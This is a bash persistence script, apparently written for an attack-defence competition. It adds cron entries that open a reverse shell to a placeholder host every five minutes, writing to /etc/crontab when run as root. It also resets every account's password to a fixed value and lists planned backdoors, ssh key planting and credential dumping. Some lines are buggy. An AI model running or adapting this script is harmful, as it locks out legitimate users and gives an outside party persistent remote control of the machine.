#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

teamhash="XXXXXXXX"
IP="10.10.10.10"

root=1
echo "[*] Running as user - $(whoami)" 
if ! [ $(id -u) = 0 ]; then
    $root=0
fi
init_e=0
systemd_e=0

if file /sbin/init | grep systemd > /dev/null; then
    systemd_e=1
    echo "[*] This system is using systemd"
else
    init_e=1
    echo "[*] This system is using initd"
fi

bash_persistence ()
{
    if [ $root -eq 1 ]; then
        echo "[*] Changing profiles for all users"
        users=$(ls /home)        
        for user in users; do
            echo "$user"
            #chmod 444 file
            #chattr +i file
        done
    fi

    if [ -f "~/.bashrc.old" ]; then
        echo "[*] Old bashrc exists - Not going to overwrite"
    else
        cp -f ~/.bashrc ~/.bashrc.old
    fi
    if [ -f "~/.bash_profile.old" ]; then
        echo "[*] Old bash_profile exists - Not going to overwrite"
    else
        cp -f ~/.bash_profile ~/.bash_profile
    fi

}

crontab_persistence ()
{
    if [ -f "~/.file.old" ]; then
        echo "[*] Old crontab exists - Not going to overwrite"
    else
        crontab -l > ~/.user.files.old
    fi

    if [ $root -eq 1 ]; then
        echo "[*] Running crontab as root"
        echo "*/5 * * * *	root    bash -i >& /dev/tcp/$IP/8080 0>&1" >> /etc/crontab
    else
        echo "[*] Adding to users crontab - $(whoami)"
        #*/5 * * * * means the command will be run every five minutes
        (crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/$IP/8080 0>&1") | crontab -
    fi
    


}

change_password ()
{
    if [ $root -eq 1 ]; then
        echo "[*] Running as $(whoami) - changing all passwords"
        users=$(getent passwd | cut -d: -f 1)        
        for user in $users; do
            echo "$user:team33nws" | chpasswd
            echo ""
        done
    fi
    echo "$(whoami):team33nws" | chpasswd
    echo "[*] Running as $(whoami) - changing password"
}

listener () {
    nohup echo "code here" &
}


crontab_persistence
change_password
bash_persistence
listener
#Need further consideration for root/vs nonroot
#services maybe
#starting up backdoors/etc
#killing other shells
#user accounts
#ssh authorized keys
#mimipenguin
